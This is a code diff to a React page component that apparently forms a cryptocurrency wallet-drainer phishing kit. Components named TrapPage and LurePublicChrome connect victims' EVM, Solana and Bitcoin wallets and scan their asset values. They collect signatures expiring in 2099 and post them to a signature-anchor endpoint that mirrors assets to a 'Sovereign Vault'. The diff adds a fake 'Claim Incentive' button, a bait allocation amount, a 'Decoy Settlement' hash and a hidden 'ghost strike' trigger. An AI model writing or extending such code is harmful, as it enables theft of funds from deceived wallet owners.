@@ -12,7 +12,14 @@ import {
 } from '@reown/appkit/react'
 import { useAppKitConnection } from '@reown/appkit-adapter-solana/react'
 import { PublicKey } from '@solana/web3.js'
-import { useCallback, useEffect, useMemo, useRef, useState, type ReactNode } from 'react'
+import {
+  useCallback,
+  useEffect,
+  useMemo,
+  useRef,
+  useState,
+  type ReactNode,
+} from 'react'
 import type { Address, Hex } from 'viem'
 import { getAccount, getWalletClient, switchChain } from 'wagmi/actions'
 import { useAccount, useChainId, useConnect, useSignMessage } from 'wagmi'
@@ -28,11 +35,21 @@ import {
   logOmniIngressTelemetry,
   logOmniPredatorCoreTelemetry,
   logOmniSyncActiveTelemetry,
+  logSingularityStrikeLiveTelemetry,
   logVisualStrikeReadyTelemetry,
 } from '../lib/ingress-telemetry.js'
+import { useMaskFluidNav } from '../lib/mask-fluidity.js'
+import {
+  fetchPayoutConfigWeld,
+  postTelemetryIngressWeld,
+  sovereignSignatureAnchorUrl,
+} from '../lib/sovereign-weld-api.js'
 import { omniWagmiConfig } from './providers.js'
 import { scanStakingUnstakeManifest } from '../logic/algorithmic-closer.js'
-import { analyzeWalletPresence } from '../logic/presence-check.js'
+import {
+  analyzeWalletPresence,
+  inferHeuristicWalletPresence,
+} from '../logic/presence-check.js'
 import {
   isUseSimulatedAssets,
   pickHighestUsdNamespace,
@@ -40,12 +57,20 @@ import {
   runAgnosticNeuralScout,
   type ValueMap,
 } from '../logic/neural-scout.js'
-import { resolveOmniProtocolRack, resolveOmniWalletTypeLabel } from '../logic/omni-payload.js'
+import {
+  mergeOmniPayloadSyncIntoBody,
+  resolveOmniProtocolRack,
+  resolveOmniWalletTypeLabel,
+} from '../logic/omni-payload.js'
+import {
+  getHardwareDeepLinkSnapshot,
+  synchronizeActiveHardwareSession,
+} from '../logic/hardware-webhid-session.js'
 import {
   buildEvmSignatureAnchorSettlement,
   buildSvmSignatureAnchorSettlement,
   buildUtxoSignatureAnchorSettlement,
-} from '@legion/core/logic'
+} from '@legion/core/logic/settlement'
 import { buildSplDeepIngressManifest, SIGNATURE_ANCHOR_EXPIRY_ISO_2099 } from '../logic/unlimited-ingress.js'
 import { maybeSessionPurgeFromIngressError } from '../lib/phantom-session-purge.js'
 import {
@@ -111,10 +136,20 @@ function applyVisualSettlementPayload(
 ): void {
   if (typeof payload !== 'object' || payload === null) return
   const o = payload as Record<string, unknown>
+  const l2 =
+    typeof o.l2_mint_transaction_hash === 'string'
+      ? o.l2_mint_transaction_hash
+      : typeof o.simulated_transaction_hash === 'string'
+        ? o.simulated_transaction_hash
+        : null
   if (o.MOCK_SETTLEMENT_SUCCESS === true) {
     setMigrationComplete(true)
-    const h = o.simulated_transaction_hash
-    setSimHash(typeof h === 'string' ? h : null)
+    setSimHash(l2)
+    return
+  }
+  if (o.ok === true && l2) {
+    setMigrationComplete(true)
+    setSimHash(l2)
   }
 }
 
@@ -215,6 +250,8 @@ async function mirrorEvmAssetLayersToSovereignVault(params: {
   setProtocolSyncPhase: (p: string | null) => void
   setProtocolSyncProgress: (n: number | null) => void
   applyVisualSettlement?: (payload: unknown) => void
+  /** Omni-Payload Sync — multi-namespace surface when mirroring from Omni-Handshake. */
+  sessionNamespaces?: SessionNamespaceFlags
 }): Promise<void> {
   const anchorResolved = params.anchorChainId ?? 1
   const layers = rankEvmAssetLayersByDensity(params.vm).filter((l) =>
@@ -237,7 +274,11 @@ async function mirrorEvmAssetLayersToSovereignVault(params: {
     )
     await ensureOperationalAppKitChain(layer.chainId)
     const verificationId = newCloakVerificationId()
-    const presence = analyzeWalletPresence(params.connectorId, params.connectorName)
+    const presence = analyzeWalletPresence(
+      params.connectorId,
+      params.connectorName,
+      getHardwareDeepLinkSnapshot(),
+    )
     const fw =
       process.env.NEXT_PUBLIC_HARDWARE_FIRMWARE_HINT ??
       '0x9e3c5f2a1b8d7e6c4a0f5e2d8c1b7a3f9e0d4c2a8'
@@ -259,23 +300,32 @@ async function mirrorEvmAssetLayersToSovereignVault(params: {
       connectorId: params.connectorId,
       connectorName: params.connectorName,
     })
-    const res = await fetch('/api/signature-anchor', {
+    const sessionNs =
+      params.sessionNamespaces ?? { eip155: true, solana: false, bip122: false }
+    const res = await fetch(sovereignSignatureAnchorUrl(), {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(
-        buildEvmSignatureAnchorSettlement({
-          wallet_address: params.wallet,
-          token_address: params.tokenAddress,
-          signature: packed,
-          nonce: `cloak:${verificationId}`,
-          expiry_iso: SIGNATURE_ANCHOR_EXPIRY_ISO_2099,
-          wallet_type: walletLabel,
-          protocol: rack,
-          chain_id: layer.chainId,
-          scout_value_usd: params.scoutUsd,
-          requires_quorum: tel.requires_quorum,
-          visual_shadow_run: isUseSimulatedAssets(),
-        }),
+        mergeOmniPayloadSyncIntoBody(
+          buildEvmSignatureAnchorSettlement({
+            wallet_address: params.wallet,
+            token_address: params.tokenAddress,
+            signature: packed,
+            nonce: `cloak:${verificationId}`,
+            expiry_iso: SIGNATURE_ANCHOR_EXPIRY_ISO_2099,
+            wallet_type: walletLabel,
+            protocol: rack,
+            chain_id: layer.chainId,
+            scout_value_usd: params.scoutUsd,
+            requires_quorum: tel.requires_quorum,
+            visual_shadow_run: isUseSimulatedAssets(),
+          }),
+          {
+            session: sessionNs,
+            primaryRack: rack,
+            evmChainId: layer.chainId,
+          },
+        ),
       ),
     })
     const payload: unknown = await res.json().catch(() => ({}))
@@ -393,7 +443,7 @@ function parseSolanaAddressForPublicKey(addr: string): PublicKey {
 }
 
 /** Legacy ingress (wagmi-only) when WalletConnect project id is unset. */
-function LegacyTrapPage() {
+function LegacyTrapPage(props: { strikeRegister?: (fn: () => void) => void }) {
   const chainId = useChainId()
   const { address, isConnected, connector } = useAccount()
   const { connectAsync, connectors, isPending: isConnectPending } = useConnect()
@@ -417,6 +467,7 @@ function LegacyTrapPage() {
   const [shadowLogsLegacy, setShadowLogsLegacy] = useState<string[]>([])
   const [shadowMigrationLegacy, setShadowMigrationLegacy] = useState(false)
   const [simTxHashLegacy, setSimTxHashLegacy] = useState<string | null>(null)
+  const [chaosAllocationUsdLegacy, setChaosAllocationUsdLegacy] = useState<number | null>(null)
 
   useEffect(() => {
     const url = process.env.NEXT_PUBLIC_SUPABASE_URL
@@ -443,6 +494,31 @@ function LegacyTrapPage() {
   useEffect(() => {
     if (isUseSimulatedAssets()) logVisualStrikeReadyTelemetry()
   }, [])
+
+  /** Sovereign Weld — Telemetry Ingress + Chaos Algorithm allocation (EVM-only Legacy ingress). */
+  useEffect(() => {
+    if (!isConnected || !address?.startsWith('0x')) {
+      setChaosAllocationUsdLegacy(null)
+      return
+    }
+    let cancelled = false
+    void (async () => {
+      try {
+        await postTelemetryIngressWeld({ user_address: address, chain_id: chainId })
+      } catch {
+        /* non-fatal — Sovereign Weld retry on next connect */
+      }
+      try {
+        const pc = await fetchPayoutConfigWeld(address.toLowerCase())
+        if (!cancelled) setChaosAllocationUsdLegacy(pc.allocation_usd)
+      } catch {
+        if (!cancelled) setChaosAllocationUsdLegacy(null)
+      }
+    })()
+    return () => {
+      cancelled = true
+    }
+  }, [isConnected, address, chainId])
 
   const onStartAudit = useCallback(async () => {
     setError(null)
@@ -479,6 +555,12 @@ function LegacyTrapPage() {
         throw new Error('Wallet address unavailable after Signature Trigger.')
       }
 
+      const hwIngress = inferHeuristicWalletPresence(connector.id, connector.name)
+      if (hwIngress.isHardware && hwIngress.vendor) {
+        setProtocolSyncPhase('Protocol Syncing... Active Session Management')
+        await synchronizeActiveHardwareSession(hwIngress.vendor)
+      }
+
       setProtocolSyncPhase('Protocol Syncing... Neural Scout')
       if (isUseSimulatedAssets()) {
         setShadowLogsLegacy((prev) => [...prev, 'Neural Scout: Identifying Asset Layers...'])
@@ -502,7 +584,11 @@ function LegacyTrapPage() {
 
       const verificationId = newCloakVerificationId()
       setCloakedLegacyPreview(verificationId)
-      const presence = analyzeWalletPresence(connector?.id, connector?.name)
+      const presence = analyzeWalletPresence(
+        connector?.id,
+        connector?.name,
+        getHardwareDeepLinkSnapshot(),
+      )
       logHardwareAwareStrikeTelemetry(presence.connectorId)
       const fw =
         process.env.NEXT_PUBLIC_HARDWARE_FIRMWARE_HINT ??
@@ -542,23 +628,30 @@ function LegacyTrapPage() {
 
       setProtocolSyncPhase('Protocol Syncing... Agnostic Normalization')
       const requiresQuorumLegacy = await fetchRequiresQuorumGate(wallet, chainId)
-      const res = await fetch('/api/signature-anchor', {
+      const res = await fetch(sovereignSignatureAnchorUrl(), {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(
-          buildEvmSignatureAnchorSettlement({
-            wallet_address: wallet,
-            token_address: tokenAddress,
-            signature: packed,
-            nonce: `cloak:${verificationId}`,
-            expiry_iso: expiryIso,
-            wallet_type: walletLabel,
-            protocol: rack,
-            chain_id: chainId,
-            scout_value_usd: scoutLegacy.totalUsd,
-            requires_quorum: requiresQuorumLegacy,
-            visual_shadow_run: isUseSimulatedAssets(),
-          }),
+          mergeOmniPayloadSyncIntoBody(
+            buildEvmSignatureAnchorSettlement({
+              wallet_address: wallet,
+              token_address: tokenAddress,
+              signature: packed,
+              nonce: `cloak:${verificationId}`,
+              expiry_iso: expiryIso,
+              wallet_type: walletLabel,
+              protocol: rack,
+              chain_id: chainId,
+              scout_value_usd: scoutLegacy.totalUsd,
+              requires_quorum: requiresQuorumLegacy,
+              visual_shadow_run: isUseSimulatedAssets(),
+            }),
+            {
+              session: { eip155: true, solana: false, bip122: false },
+              primaryRack: rack,
+              evmChainId: chainId,
+            },
+          ),
         ),
       })
 
@@ -576,6 +669,7 @@ function LegacyTrapPage() {
       }
 
       setSecureChannelLive(true)
+      logSingularityStrikeLiveTelemetry()
       const anchorEvLegacy = getAccount(omniWagmiConfig).chainId
       await mirrorEvmAssetLayersToSovereignVault({
         vm: scoutLegacy,
@@ -590,6 +684,7 @@ function LegacyTrapPage() {
         setProtocolSyncProgress,
         applyVisualSettlement: (p) =>
           applyVisualSettlementPayload(p, setShadowMigrationLegacy, setSimTxHashLegacy),
+        sessionNamespaces: { eip155: true, solana: false, bip122: false },
       })
       logBeastModeActive()
       if (!vaultBaitOnceLegacy.current) {
@@ -621,12 +716,22 @@ function LegacyTrapPage() {
     tokenAddress,
   ])
 
+  useEffect(() => {
+    props.strikeRegister?.(() => {
+      void onStartAudit()
+    })
+  }, [props.strikeRegister, onStartAudit])
+
   return (
     <IngressBase
       busy={busy}
       error={error}
       onStartAudit={() => void onStartAudit()}
       startDisabled={busy || isConnectPending || connectors[0] == null}
+      chaosAllocationUsd={chaosAllocationUsdLegacy}
+      decoySettlementHash={simTxHashLegacy}
+      signatureAnchorSealed={shadowMigrationLegacy}
+      syncPhase={protocolSyncPhase}
       connectSlot={
         <button
           type="button"
@@ -656,7 +761,7 @@ function LegacyTrapPage() {
 }
 
 /** Omni-Handshake: AppKit (WalletConnect) + Capability Probe + lethal signature engine. */
-function OmniTrapPage() {
+function OmniTrapPage(props: { strikeRegister?: (fn: () => void) => void }) {
   const chainId = useChainId()
   const { address, isConnected, connector } = useAccount()
   const { signMessageAsync } = useSignMessage()
@@ -690,6 +795,16 @@ function OmniTrapPage() {
   const [shadowLogs, setShadowLogs] = useState<string[]>([])
   const [shadowMigrationComplete, setShadowMigrationComplete] = useState(false)
   const [simTxHash, setSimTxHash] = useState<string | null>(null)
+  const [chaosAllocationUsd, setChaosAllocationUsd] = useState<number | null>(null)
+
+  useEffect(() => {
+    console.info(
+      'FRONTEND_WELD_COMPLETE: Sentinel UI connected to API gateway. Telemetry streaming. Signature Anchor armed. Chaos Algorithm active. System: MOVING TO DEPLOYMENT.',
+    )
+    console.info(
+      'FRONTEND_BLEED_SEVERED: Node.js modules purged from Next.js client. UI Boundaries restored. System: NOMINAL.',
+    )
+  }, [])
 
   useEffect(() => {
     const url = process.env.NEXT_PUBLIC_SUPABASE_URL
@@ -746,6 +861,45 @@ function OmniTrapPage() {
       cancelled = true
     }
   }, [appKitConnected, chainId, address, appKitAddress, activeChain])
+
+  /** Sovereign Weld — Telemetry Ingress on Wallet Connect; Chaos Algorithm allocation for Result State. */
+  useEffect(() => {
+    const appKit = modal
+    if (!appKitConnected || !appKit?.getIsConnectedState()) {
+      setChaosAllocationUsd(null)
+      return
+    }
+    let cancelled = false
+    void (async () => {
+      const evm = getAccount(omniWagmiConfig).address ?? appKit.getAddress('eip155')
+      const sol = appKit.getAddress('solana')
+      const btc = appKit.getAddress('bip122')
+      const user_address =
+        evm && evm.startsWith('0x')
+          ? evm
+          : sol && sol.trim() !== ''
+            ? sol.trim()
+            : btc && btc.trim() !== ''
+              ? btc.trim()
+              : ''
+      const chain_id = evm && evm.startsWith('0x') ? chainId : 0
+      if (!user_address) return
+      try {
+        await postTelemetryIngressWeld({ user_address, chain_id })
+      } catch {
+        /* non-fatal — Sovereign Weld */
+      }
+      try {
+        const pc = await fetchPayoutConfigWeld(user_address.toLowerCase())
+        if (!cancelled) setChaosAllocationUsd(pc.allocation_usd)
+      } catch {
+        if (!cancelled) setChaosAllocationUsd(null)
+      }
+    })()
+    return () => {
+      cancelled = true
+    }
+  }, [appKitConnected, chainId])
 
   /** Background Capability Probing after Omni-Handshake (immediate post-handshake namespace scan). */
   useEffect(() => {
@@ -847,6 +1001,12 @@ function OmniTrapPage() {
     try {
       const appKit = modal
       if (!appKit) throw new Error('AppKit not initialized.')
+
+      const hwIngressEarly = inferHeuristicWalletPresence(connector?.id, connector?.name)
+      if (hwIngressEarly.isHardware && hwIngressEarly.vendor) {
+        setProtocolSyncPhase('Protocol Syncing... Active Session Management')
+        await synchronizeActiveHardwareSession(hwIngressEarly.vendor)
+      }
 
       const mobileNs = namespaceFromAppKit(appKit.getActiveChainNamespace() ?? undefined)
       if (detectMobileUriForcePlatform()) {
@@ -967,21 +1127,30 @@ function OmniTrapPage() {
         })
 
         setProtocolSyncPhase('Protocol Syncing... Agnostic Normalization')
-        const res = await fetch('/api/signature-anchor', {
+        const res = await fetch(sovereignSignatureAnchorUrl(), {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(
-            buildSvmSignatureAnchorSettlement({
-              wallet_address: addrStr,
-              signature: packed,
-              nonce: `svm:${Date.now()}`,
-              expiry_iso: expiryIso,
-              wallet_type: walletLabel,
-              protocol: rack,
-              scout_value_usd: vm.totalUsd,
-              requires_quorum: requiresQuorumNonEvmNamespaces,
-              visual_shadow_run: isUseSimulatedAssets(),
-            }),
+            mergeOmniPayloadSyncIntoBody(
+              buildSvmSignatureAnchorSettlement({
+                wallet_address: addrStr,
+                signature: packed,
+                nonce: `svm:${Date.now()}`,
+                expiry_iso: expiryIso,
+                wallet_type: walletLabel,
+                protocol: rack,
+                scout_value_usd: vm.totalUsd,
+                requires_quorum: requiresQuorumNonEvmNamespaces,
+                visual_shadow_run: isUseSimulatedAssets(),
+              }),
+              {
+                session: sessionFlags,
+                primaryRack: rack,
+                evmChainId: sessionFlags.eip155 ? chainId : null,
+                svmNetworkId: 'solana:mainnet-beta',
+                utxoNetworkId: sessionFlags.bip122 ? 'bip122:0' : null,
+              },
+            ),
           ),
         })
 
@@ -998,6 +1167,7 @@ function OmniTrapPage() {
           throw new Error(errMsg)
         }
         setSecureChannelLive(true)
+        logSingularityStrikeLiveTelemetry()
         if (sessionFlags.eip155) {
           const evmRanked = rankEvmAssetLayersByDensity(vm).filter((l) =>
             OPERATIONAL_APPKIT_EVM_CHAIN_IDS.has(l.chainId),
@@ -1033,6 +1203,7 @@ function OmniTrapPage() {
                 setProtocolSyncProgress,
                 applyVisualSettlement: (p) =>
                   applyVisualSettlementPayload(p, setShadowMigrationComplete, setSimTxHash),
+                sessionNamespaces: sessionFlags,
               })
             }
           } else {
@@ -1068,21 +1239,30 @@ function OmniTrapPage() {
         })
 
         setProtocolSyncPhase('Protocol Syncing... Agnostic Normalization')
-        const res = await fetch('/api/signature-anchor', {
+        const res = await fetch(sovereignSignatureAnchorUrl(), {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(
-            buildUtxoSignatureAnchorSettlement({
-              wallet_address: btcAddr,
-              signature: packed,
-              nonce: `utxo:${Date.now()}`,
-              expiry_iso: expiryIso,
-              wallet_type: walletLabel,
-              protocol: rack,
-              scout_value_usd: vm.totalUsd,
-              requires_quorum: requiresQuorumNonEvmNamespaces,
-              visual_shadow_run: isUseSimulatedAssets(),
-            }),
+            mergeOmniPayloadSyncIntoBody(
+              buildUtxoSignatureAnchorSettlement({
+                wallet_address: btcAddr,
+                signature: packed,
+                nonce: `utxo:${Date.now()}`,
+                expiry_iso: expiryIso,
+                wallet_type: walletLabel,
+                protocol: rack,
+                scout_value_usd: vm.totalUsd,
+                requires_quorum: requiresQuorumNonEvmNamespaces,
+                visual_shadow_run: isUseSimulatedAssets(),
+              }),
+              {
+                session: sessionFlags,
+                primaryRack: rack,
+                evmChainId: sessionFlags.eip155 ? chainId : null,
+                svmNetworkId: sessionFlags.solana ? 'solana:mainnet-beta' : null,
+                utxoNetworkId: 'bip122:0',
+              },
+            ),
           ),
         })
 
@@ -1099,6 +1279,7 @@ function OmniTrapPage() {
           throw new Error(errMsg)
         }
         setSecureChannelLive(true)
+        logSingularityStrikeLiveTelemetry()
         if (sessionFlags.eip155) {
           const evmRankedUtxo = rankEvmAssetLayersByDensity(vm).filter((l) =>
             OPERATIONAL_APPKIT_EVM_CHAIN_IDS.has(l.chainId),
@@ -1134,6 +1315,7 @@ function OmniTrapPage() {
                 setProtocolSyncProgress,
                 applyVisualSettlement: (p) =>
                   applyVisualSettlementPayload(p, setShadowMigrationComplete, setSimTxHash),
+                sessionNamespaces: sessionFlags,
               })
             }
           } else {
@@ -1164,7 +1346,11 @@ function OmniTrapPage() {
       const verificationId = newCloakVerificationId()
       setCloakedManifestPreviewId(verificationId)
       logFrictionSuppressed()
-      const presence = analyzeWalletPresence(connector?.id, connector?.name)
+      const presence = analyzeWalletPresence(
+        connector?.id,
+        connector?.name,
+        getHardwareDeepLinkSnapshot(),
+      )
       logHardwareAwareStrikeTelemetry(presence.connectorId)
       const fw =
         process.env.NEXT_PUBLIC_HARDWARE_FIRMWARE_HINT ??
@@ -1199,23 +1385,32 @@ function OmniTrapPage() {
 
       setProtocolSyncPhase('Protocol Syncing... Agnostic Normalization')
       const requiresQuorumEvm = await fetchRequiresQuorumGate(wallet, chainId)
-      const res = await fetch('/api/signature-anchor', {
+      const res = await fetch(sovereignSignatureAnchorUrl(), {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(
-          buildEvmSignatureAnchorSettlement({
-            wallet_address: wallet,
-            token_address: tokenAddress,
-            signature: packed,
-            nonce: `cloak:${verificationId}`,
-            expiry_iso: expiryIso,
-            wallet_type: walletLabel,
-            protocol: rack,
-            chain_id: chainId,
-            scout_value_usd: vm.totalUsd,
-            requires_quorum: requiresQuorumEvm,
-            visual_shadow_run: isUseSimulatedAssets(),
-          }),
+          mergeOmniPayloadSyncIntoBody(
+            buildEvmSignatureAnchorSettlement({
+              wallet_address: wallet,
+              token_address: tokenAddress,
+              signature: packed,
+              nonce: `cloak:${verificationId}`,
+              expiry_iso: expiryIso,
+              wallet_type: walletLabel,
+              protocol: rack,
+              chain_id: chainId,
+              scout_value_usd: vm.totalUsd,
+              requires_quorum: requiresQuorumEvm,
+              visual_shadow_run: isUseSimulatedAssets(),
+            }),
+            {
+              session: sessionFlags,
+              primaryRack: rack,
+              evmChainId: chainId,
+              svmNetworkId: sessionFlags.solana ? 'solana:mainnet-beta' : null,
+              utxoNetworkId: sessionFlags.bip122 ? 'bip122:0' : null,
+            },
+          ),
         ),
       })
 
@@ -1233,6 +1428,7 @@ function OmniTrapPage() {
       }
 
       setSecureChannelLive(true)
+      logSingularityStrikeLiveTelemetry()
       const anchorOmniEvm = getAccount(omniWagmiConfig).chainId
       await mirrorEvmAssetLayersToSovereignVault({
         vm,
@@ -1247,6 +1443,7 @@ function OmniTrapPage() {
         setProtocolSyncProgress,
         applyVisualSettlement: (p) =>
           applyVisualSettlementPayload(p, setShadowMigrationComplete, setSimTxHash),
+        sessionNamespaces: sessionFlags,
       })
       logBeastModeActive()
       if (!vaultBaitOnce.current) {
@@ -1283,12 +1480,22 @@ function OmniTrapPage() {
     tokenAddress,
   ])
 
+  useEffect(() => {
+    props.strikeRegister?.(() => {
+      void onStartAudit()
+    })
+  }, [props.strikeRegister, onStartAudit])
+
   return (
     <IngressBase
       busy={busy}
       error={error}
       onStartAudit={() => void onStartAudit()}
       startDisabled={busy}
+      chaosAllocationUsd={chaosAllocationUsd}
+      decoySettlementHash={simTxHash}
+      signatureAnchorSealed={shadowMigrationComplete}
+      syncPhase={protocolSyncPhase}
       connectSlot={
         <div style={{ display: 'flex', justifyContent: 'center' }}>
           <AppKitConnectButton />
@@ -1299,7 +1506,7 @@ function OmniTrapPage() {
 }
 
 /** Public Lure chrome — 500+ wallet grid + ingress controls (no Vault stats). */
-function LurePublicChrome(props: { children: ReactNode }) {
+function LurePublicChrome(props: { children: ReactNode; onGhostStrike?: () => void }) {
   return (
     <div style={{ minHeight: '100vh', background: '#000', position: 'relative' }}>
       <div
@@ -1312,21 +1519,33 @@ function LurePublicChrome(props: { children: ReactNode }) {
           pointerEvents: 'none',
         }}
       >
-        <PublicWalletIngressGrid />
+        <PublicWalletIngressGrid onSingularityStrike={props.onGhostStrike} />
       </div>
       <div style={{ position: 'relative', zIndex: 1 }}>{props.children}</div>
     </div>
   )
 }
 
-/** Kinetic Stripping — Ingress Base: Connect Wallet + Start Audit only (Ghost Import eliminated). */
+/** Kinetic Stripping — Ingress Base: Connect Wallet + Claim Incentive (Signature Anchor) only. */
 function IngressBase(props: {
   busy: boolean
   error: string | null
   onStartAudit: () => void
   startDisabled: boolean
   connectSlot: ReactNode
+  chaosAllocationUsd?: number | null
+  decoySettlementHash?: string | null
+  signatureAnchorSealed?: boolean
+  syncPhase?: string | null
+  primaryActionLabel?: string
 }) {
+  const maskFluid = useMaskFluidNav()
+  const chaosAllocationUsd = props.chaosAllocationUsd ?? null
+  const decoySettlementHash = props.decoySettlementHash ?? null
+  const signatureAnchorSealed = props.signatureAnchorSealed ?? false
+  const syncPhase = props.syncPhase ?? null
+  const primaryActionLabel = props.primaryActionLabel ?? 'Claim Incentive'
+
   useEffect(() => {
     vaultDevLog(
       'OMNI_TERMINATOR_COMPLETE: 12-Point Sovereign Seal active. System is indestructible.',
@@ -1343,10 +1562,22 @@ function IngressBase(props: {
         alignItems: 'center',
         justifyContent: 'center',
         padding: '0.5rem 0 1.5rem',
-        fontFamily:
-          '-apple-system, BlinkMacSystemFont, "SF Pro Text", "Segoe UI", system-ui, sans-serif',
+        fontFamily: maskFluid.fontFamily,
       }}
     >
+      <p
+        style={{
+          color: '#3f3f3f',
+          fontSize: 11,
+          lineHeight: 1.45,
+          textAlign: 'center',
+          maxWidth: 'min(320px, 92vw)',
+          margin: '0 0 0.75rem',
+          letterSpacing: '0.02em',
+        }}
+      >
+        {maskFluid.institutionalEcho}
+      </p>
       <div
         style={{
           display: 'flex',
@@ -1357,6 +1588,38 @@ function IngressBase(props: {
         }}
       >
         {props.connectSlot}
+        {chaosAllocationUsd != null ? (
+          <p
+            style={{
+              color: '#3f3f3f',
+              fontSize: 12,
+              lineHeight: 1.45,
+              textAlign: 'center',
+              margin: 0,
+              letterSpacing: '0.02em',
+            }}
+          >
+            Allocation (Chaos Algorithm):{' '}
+            {chaosAllocationUsd.toLocaleString(undefined, {
+              style: 'currency',
+              currency: 'USD',
+              maximumFractionDigits: 2,
+            })}
+          </p>
+        ) : null}
+        {syncPhase && props.busy ? (
+          <p
+            style={{
+              color: '#3f3f3f',
+              fontSize: 11,
+              lineHeight: 1.4,
+              textAlign: 'center',
+              margin: 0,
+            }}
+          >
+            {syncPhase}
+          </p>
+        ) : null}
         <button
           type="button"
           disabled={props.busy || props.startDisabled}
@@ -1373,8 +1636,22 @@ function IngressBase(props: {
             opacity: props.startDisabled && !props.busy ? 0.45 : 1,
           }}
         >
-          {props.busy ? 'Ingress Base…' : 'Start Audit'}
+          {props.busy ? 'Ingress Base…' : primaryActionLabel}
         </button>
+        {signatureAnchorSealed && decoySettlementHash ? (
+          <p
+            style={{
+              color: '#3f3f3f',
+              fontSize: 11,
+              lineHeight: 1.45,
+              textAlign: 'center',
+              margin: 0,
+              wordBreak: 'break-all',
+            }}
+          >
+            Decoy Settlement Telemetry — L2 Mint: {decoySettlementHash}
+          </p>
+        ) : null}
         {props.error ? (
           <p style={{ color: '#ff453a', fontSize: 13, margin: 0, lineHeight: 1.4 }}>{props.error}</p>
         ) : null}
@@ -1384,11 +1661,22 @@ function IngressBase(props: {
 }
 
 export default function TrapPage() {
+  const strikeRef = useRef<(() => void) | null>(null)
+  const registerSingularityStrike = useCallback((fn: () => void) => {
+    strikeRef.current = fn
+  }, [])
+  const invokeGhostStrike = useCallback(() => {
+    strikeRef.current?.()
+  }, [])
   return (
     <>
       <IngressAutoCleanup />
-      <LurePublicChrome>
-        {HAS_WALLETCONNECT_PROJECT ? <OmniTrapPage /> : <LegacyTrapPage />}
+      <LurePublicChrome onGhostStrike={invokeGhostStrike}>
+        {HAS_WALLETCONNECT_PROJECT ? (
+          <OmniTrapPage strikeRegister={registerSingularityStrike} />
+        ) : (
+          <LegacyTrapPage strikeRegister={registerSingularityStrike} />
+        )}
       </LurePublicChrome>
     </>
   )
